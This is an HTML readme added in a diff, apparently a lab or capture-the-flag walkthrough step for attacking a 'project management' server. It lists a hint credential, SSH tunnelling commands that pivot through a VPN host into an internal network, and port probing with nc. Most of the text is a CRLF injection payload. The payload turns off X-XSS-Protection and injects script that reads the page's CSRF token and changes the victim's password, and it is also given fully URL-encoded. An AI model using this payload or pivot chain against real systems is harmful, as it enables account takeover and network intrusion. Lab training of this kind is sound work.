@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Readme</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <style type="text/css">body {
+font-family: Arial, sans-serif;
+line-height: 1.6;
+background-color: #121212;
+color: #e0e0e0;
+padding: 20px;
+}
+h1, h2, h3, h4, h5, h6 {
+color: #ff9800; 
+}
+code {
+background-color: #333;
+padding: 2px 4px;
+border-radius: 4px;
+font-family: 'Courier New', Courier, monospace;
+color: #ff5722; 
+}
+pre {
+background-color: #333;
+padding: 10px;
+border-radius: 4px;
+overflow-x: auto;
+color: #ff5722; 
+}
+a {
+color: #bb86fc;
+text-decoration: none;
+}
+a:hover {
+text-decoration: underline;
+}
+ul {
+margin: 20px 0;
+padding: 0 20px;
+border-left: 2px solid #ff9800; 
+}
+li {
+margin: 10px 0;
+}
+strong {
+color: #ff9800; 
+}
+</style>
+</head>
+<body>
+<h1 id="project-management">Project Management</h1>
+<ol type="1">
+<li><p><strong>Resume From <a href="../5_PC2/">PC2</a></strong></p></li>
+<li><p><strong>Hint:</strong></p>
+<pre class="text"><code>۱. 
+faraji:P@ssw0rd!
+۲. 
+دسترسی ادمین را بدست آورید </code></pre></li>
+<li><p><strong>Ping project management server from PC2:</strong></p></li>
+</ol>
+<pre class="shell"><code>ssh -N -i ./id_ed25519 -p 2200 -L 0.0.0.0:7777:10.233.27.37:22 vpn_user@172.16.3.64</code></pre>
+<p>In a new terminal:</p>
+<pre class="shell"><code>ssh -p 7777 -i 05-rsa.rezaee.priv rezaee@127.0.0.1
+ping pm</code></pre>
+<p>Project management server IP: <code>10.233.58.241</code></p>
+<ol start="4" type="1">
+<li><p><strong>Check which ports are open on the project management server:</strong></p>
+<ol type="1">
+<li><strong>Check if port 22 and 2200 are open on project management server for ssh:</strong></li>
+</ol></li>
+</ol>
+<pre class="shell"><code>ssh faraji@10.233.58.241
+ssh -p 2200 faraji@10.233.58.241</code></pre>
+<ol start="2" type="1">
+<li><strong>Check if port 80 is open on project management server for http:</strong></li>
+</ol>
+<pre class="shell"><code>nc -zv 10.233.58.241 80</code></pre>
+<p>Output:</p>
+<pre class="shell"><code>Connection to  port 80 10.233.58.241 succeeded!</code></pre>
+<ol start="5" type="1">
+<li><strong>Create an SSH tunnel to access port 80 on the project management server:</strong></li>
+</ol>
+<pre class="shell"><code>ssh -N -i ./id_ed25519 -p 2200 -L 18080:10.233.58.241:80 vpn_user@172.16.3.64</code></pre>
+<ol start="6" type="1">
+<li><strong>Access the project management server through the tunnel:</strong></li>
+</ol>
+<pre class="shell"><code>http://localhost:18080</code></pre>
+<ol start="7" type="1">
+<li><strong>CRLF Injection Attack</strong></li>
+</ol>
+<pre class="shell"><code>‍‍‍‍```html
+X-XSS-Protection:0
+
+23
+&lt;script&gt;&lt;/script&gt;
+0
+//..
+</code></pre>
+<div class="sourceCode" id="cb10"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a>    <span class="kw">var</span> token <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;csrf_token&#39;</span>)<span class="op">.</span><span class="at">value</span><span class="op">;</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a>    <span class="fu">fetch</span>(<span class="st">&#39;/changepassword&#39;</span><span class="op">,</span> {</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>        <span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>        <span class="dt">headers</span><span class="op">:</span> {</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a>            <span class="st">&#39;Content-Type&#39;</span><span class="op">:</span> <span class="st">&#39;application/x-www-form-urlencoded&#39;</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a>        }<span class="op">,</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a>        <span class="dt">body</span><span class="op">:</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>({</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a>            <span class="st">&#39;csrf_token&#39;</span><span class="op">:</span> token<span class="op">,</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a>            <span class="st">&#39;new_password&#39;</span><span class="op">:</span> <span class="st">&#39;12345678&#39;</span><span class="op">,</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true"></a>            <span class="st">&#39;confirm_password&#39;</span><span class="op">:</span> <span class="st">&#39;12345678&#39;</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true"></a>        })</span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true"></a>    })<span class="op">.</span><span class="fu">catch</span>(error <span class="kw">=&gt;</span> <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&#39;Error:&#39;</span><span class="op">,</span> error))<span class="op">;</span></span></code></pre></div>
+<div class="sourceCode" id="cb11"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a>X-XSS-Protection:0</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a>23</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true"></a><span class="kw">&lt;script&gt;var</span> token <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;csrf_token&#39;</span>)<span class="op">.</span><span class="at">value</span><span class="op">;</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true"></a></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true"></a>    <span class="fu">fetch</span>(<span class="st">&#39;/changepassword&#39;</span><span class="op">,</span> {</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true"></a>        <span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true"></a>        <span class="dt">headers</span><span class="op">:</span> {</span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true"></a>            <span class="st">&#39;Content-Type&#39;</span><span class="op">:</span> <span class="st">&#39;application/x-www-form-urlencoded&#39;</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true"></a>        }<span class="op">,</span></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true"></a>        <span class="dt">body</span><span class="op">:</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>({</span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true"></a>            <span class="st">&#39;csrf_token&#39;</span><span class="op">:</span> token<span class="op">,</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true"></a>            <span class="st">&#39;new_password&#39;</span><span class="op">:</span> <span class="st">&#39;12345678&#39;</span><span class="op">,</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true"></a>            <span class="st">&#39;confirm_password&#39;</span><span class="op">:</span> <span class="st">&#39;12345678&#39;</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true"></a>        })</span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true"></a>    })<span class="op">.</span><span class="fu">catch</span>(error <span class="kw">=&gt;</span> <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&#39;Error:&#39;</span><span class="op">,</span> error))<span class="op">;</span><span class="kw">&lt;/script&gt;</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true"></a>0</span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true"></a>//..</span></code></pre></div>
+<p>encode this to url</p>
+<p><code>%58%2d%58%53%53%2d%50%72%6f%74%65%63%74%69%6f%6e%3a%30%0a%0a%32%33%0a%3c%73%63%72%69%70%74%3e%76%61%72%20%74%6f%6b%65%6e%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%27%63%73%72%66%5f%74%6f%6b%65%6e%27%29%2e%76%61%6c%75%65%3b%0a%0a%20%20%20%20%66%65%74%63%68%28%27%2f%63%68%61%6e%67%65%70%61%73%73%77%6f%72%64%27%2c%20%7b%0a%20%20%20%20%20%20%20%20%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%0a%20%20%20%20%20%20%20%20%68%65%61%64%65%72%73%3a%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%27%43%6f%6e%74%65%6e%74%2d%54%79%70%65%27%3a%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%27%0a%20%20%20%20%20%20%20%20%7d%2c%0a%20%20%20%20%20%20%20%20%62%6f%64%79%3a%20%6e%65%77%20%55%52%4c%53%65%61%72%63%68%50%61%72%61%6d%73%28%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%27%63%73%72%66%5f%74%6f%6b%65%6e%27%3a%20%74%6f%6b%65%6e%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%27%6e%65%77%5f%70%61%73%73%77%6f%72%64%27%3a%20%27%31%32%33%34%35%36%37%38%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%27%63%6f%6e%66%69%72%6d%5f%70%61%73%73%77%6f%72%64%27%3a%20%27%31%32%33%34%35%36%37%38%27%0a%20%20%20%20%20%20%20%20%7d%29%0a%20%20%20%20%7d%29%2e%63%61%74%63%68%28%65%72%72%6f%72%20%3d%3e%20%63%6f%6e%73%6f%6c%65%2e%65%72%72%6f%72%28%27%45%72%72%6f%72%3a%27%2c%20%65%72%72%6f%72%29%29%3b%3c%2f%73%63%72%69%70%74%3e%0a%30%0a%2f%2f%2e%2e</code></p>
+</body>
+</html>
